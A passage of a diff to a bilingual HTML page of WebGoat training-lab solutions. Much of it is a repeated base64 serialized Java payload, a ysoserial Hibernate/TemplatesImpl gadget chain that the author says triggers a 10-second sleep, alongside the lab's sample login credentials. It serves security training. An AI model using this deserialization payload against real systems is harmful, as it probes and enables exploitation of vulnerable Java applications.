JDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXRxAH4AIEwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AIEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwcQB-ACd0ABNnZXRPdXRwdXRQcm9wZXJ0aWVzdAAEdGVzdHBwcHBwcHBwcHB1cgAaW0xvcmcuaGliZXJuYXRlLnR5cGUuVHlwZTt-r6uh5JVhmgIAAHhwAAAAAXEAfgAScHBzcQB-ACIAAAAA_____wB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABiXK_rq-AAAAMQAyBwAwAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQoAAwAQDAAMAA0BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAZAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEAH3lzb3NlcmlhbC9Qd25lcjIzNzU0MjU1MzE4ODA2MDABACFMeXNvc2VyaWFsL1B3bmVyMjM3NTQyNTUzMTg4MDYwMDsAIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAQAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAuABIAAAAMAAEAAAAFABMAMQAAAAEAFQAWAAIAFwAAAAQAAQAYAA4AAAA_AAAAAwAAAAGxAAAAAgARAAAABgABAAAAMwASAAAAIAADAAAAAQATADEAAAAAAAEAGgAbAAEAAAABABwAHQACAAEAFQAeAAIAFwAAAAQAAQAYAA4AAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAANwASAAAAKgAEAAAAAQATADEAAAAAAAEAGgAbAAEAAAABAB8AIAACAAAAAQAhACIAAwAIACkADQABAA4AAAAZAAMAAgAAAA2nAAMBTBEnEIW4AC-xAAAAAAACACMAAAACACQAJQAAAAoAAQABACYAKAAJdXEAfgAwAAAB1Mr-ur4AAAAxABsHAAIBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcABAEAEGphdmEvbGFuZy9PYmplY3QHAAYBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUKAAMAEAwADAANAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAEAAwABAAUAAQAaAAcACAABAAkAAAACAAoAAQABAAwADQABAA4AAAAvAAEAAQAAAAUqtwAPsQAAAAIAEQAAAAYAAQAAADsAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEAAQAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACxxAH4ANHg
+            </code>
+            <br>
+            The <a href="https://github.com/frohoff/ysoserial">ysoserial library</a> seems to be a search track too.
+        </span>
+    </div>
 </div>
+
 <div><br></div>
 <div><br></div>
+
 <div>
-	<h4><u><b>Insecure Communication:</b></u></h4>
+    <h4><u><b>(A9) Vulnerable Components:</b></u></h4>
     <div>
-		<div><br></div>
-		<h5>Insecure Login</h5>
-		<div><br></div>
-		<span class="multilang" lang="fr">
-			2. Cliquer sur <b>Log in</b> avec l'onglet <i>Réseau</i> des <i>Outils de développement</i> ouverts par exemple.
-			Observer la requête vers http://host:port/WebGoat/start.mvc.
-			Remarque les paramètres <code>{"username":"CaptainJack","password":"BlackPearl"}</code>.
-			</span>
-		<span class="multilang" lang="en">
-			2. Click <b> Log in </b> with the <i>Network</i> tab of the <i>Development Tools</i> opened for example.
-			Observe the request to http://host:port/WebGoat/start.mvc.
-			Note the parameters <code>{"username":"CaptainJack","password":"BlackPearl"}</code>.
-			</span>
-	</div>
-</div>	
-<div><br></div>
-<div><br></div>
-<div>
-	<h4><u><b>Insecure Deserialization:</b></u></h4>
-    <div>
-		<div><br></div>
-		<h5>Insecure Deserialization</h5>
-		<div><br></div>
-		<span class="multilang" lang="fr">
-			5. Je n'ai pas réussi à valider la leçon, les pistes que j'ai pu trouver sont les suivantes:
-			<br>
-			Le package à utiliser pour déclencher la faille serait Hibernate 5.
-			<br>
-			Le payload suivant, trouvé dans un <a href="https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java">module</a> de Burp Suite fonctionne, mais déclenche un Sleep de 10 secondes:
-			<br>
-			<code>
-				rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXRxAH4AIEwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AIEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwcQB-ACd0ABNnZXRPdXRwdXRQcm9wZXJ0aWVzdAAEdGVzdHBwcHBwcHBwcHB1cgAaW0xvcmcuaGliZXJuYXRlLnR5cGUuVHlwZTt-r6uh5JVhmgIAAHhwAAAAAXEAfgAScHBzcQB-ACIAAAAA_____wB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABiXK_rq-AAAAMQAyBwAwAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQoAAwAQDAAMAA0BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAZAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEAH3lzb3NlcmlhbC9Qd25lcjIzNzU0MjU1MzE4ODA2MDABACFMeXNvc2VyaWFsL1B3bmVyMjM3NTQyNTUzMTg4MDYwMDsAIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAQAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAuABIAAAAMAAEAAAAFABMAMQAAAAEAFQAWAAIAFwAAAAQAAQAYAA4AAAA_AAAAAwAAAAGxAAAAAgARAAAABgABAAAAMwASAAAAIAADAAAAAQATADEAAAAAAAEAGgAbAAEAAAABABwAHQACAAEAFQAeAAIAFwAAAAQAAQAYAA4AAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAANwASAAAAKgAEAAAAAQATADEAAAAAAAEAGgAbAAEAAAABAB8AIAACAAAAAQAhACIAAwAIACkADQABAA4AAAAZAAMAAgAAAA2nAAMBTBEnEIW4AC-xAAAAAAACACMAAAACACQAJQAAAAoAAQABACYAKAAJdXEAfgAwAAAB1Mr-ur4AAAAxABsHAAIBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcABAEAEGphdmEvbGFuZy9PYmplY3QHAAYBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUKAAMAEAwADAANAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAEAAwABAAUAAQAaAAcACAABAAkAAAACAAoAAQABAAwADQABAA4AAAAvAAEAAQAAAAUqtwAPsQAAAAIAEQAAAAYAAQAAADsAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEAAQAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACxxAH4ANHg
-			</code>
-			<br>
-			La <a href="https://github.com/frohoff/ysoserial">bibliothèque ysoserial</a> semble être une piste de recherche aussi.
-		</span>
-		<span class="multilang" lang="en">
-			5. I could not validate the lesson, here the hints I have found:
-			<br>
-			The package to use to trigger the flaw seems to be Hibernate 5.
-			<br>
-			The following payload, found in a <a href="https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java">Burp Suite module</a> works but triggers a 10 seconds sleep.
-			<br>
-			<code>
-				rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXRxAH4AIEwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AIEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwcQB-ACd0ABNnZXRPdXRwdXRQcm9wZXJ0aWVzdAAEdGVzdHBwcHBwcHBwcHB1cgAaW0xvcmcuaGliZXJuYXRlLnR5cGUuVHlwZTt-r6uh5JVhmgIAAHhwAAAAAXEAfgAScHBzcQB-ACIAAAAA_____wB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABiXK_rq-AAAAMQAyBwAwAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQoAAwAQDAAMAA0BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAZAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEAH3lzb3NlcmlhbC9Qd25lcjIzNzU0MjU1MzE4ODA2MDABACFMeXNvc2VyaWFsL1B3bmVyMjM3NTQyNTUzMTg4MDYwMDsAIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAQAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAuABIAAAAMAAEAAAAFABMAMQAAAAEAFQAWAAIAFwAAAAQAAQAYAA4AAAA_AAAAAwAAAAGxAAAAAgARAAAABgABAAAAMwASAAAAIAADAAAAAQATADEAAAAAAAEAGgAbAAEAAAABABwAHQACAAEAFQAeAAIAFwAAAAQAAQAYAA4AAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAANwASAAAAKgAEAAAAAQATADEAAAAAAAEAGgAbAAEAAAABAB8AIAACAAAAAQAhACIAAwAIACkADQABAA4AAAAZAAMAAgAAAA2nAAMBTBEnEIW4AC-xAAAAAAACACMAAAACACQAJQAAAAoAAQABACYAKAAJdXEAfgAwAAAB1Mr-ur4AAAAxABsHAAIBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcABAEAEGphdmEvbGFuZy9PYmplY3QHAAYBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUKAAMAEAwADAANAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhY